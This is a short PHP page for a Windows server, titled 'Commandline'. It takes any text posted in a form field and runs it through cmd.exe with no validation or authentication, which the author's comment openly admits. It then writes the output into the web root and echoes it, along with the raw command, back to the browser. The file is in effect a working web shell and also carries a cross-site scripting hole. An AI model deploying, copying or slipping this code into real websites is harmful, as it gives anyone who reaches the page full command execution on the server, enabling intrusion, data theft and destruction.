<?php
$Command = $_POST["Command"];

if (!isset($_POST['Submit'])) { // If page is not submitted to self echo form.
?>
 <head>
 <title>Commandline</title>
 </head>
 <body>
 <form method="post" action="<?php echo $PHP_SELF;?>">
  C:\>&nbsp&nbsp&nbsp<input type="text" size="12" maxlength="120" name="Command"/><br />
  <input type="Submit" value=" Run " name="Submit"/>
 </form>
  </body>
<?php  // Run as if from the windows command prompt, end after - output in textfile (needs to be system writable), must be done so output does not hang php.
 }else{    // HAHAHA!  No validation.  >_<
  exec('cmd.exe /c' . $Command . '>' . $_SERVER["DOCUMENT_ROOT"] . '\outputlog.txt');?> 
 <head>
 <script type="text/javascript">
 function goBack()
   {
   window.history.back()
   }
 </script>
 <title>Commandline</title>
 </head>
<?php  // Display the results of the command line by line - display new command button (just a browser back, a cheat to get the previous command to populate).
  echo "<b>$Command results</b>&nbsp&nbsp&nbsp<input type=\"button\" value=\"New Command\" onclick=\"goBack()\" /><br /><br />";
  $lines = file('outputlog.txt');
  foreach ($lines as $line_num => $line) {
    echo "<b>{$line_num}</b> : $line <br />\n";
}

 }
?>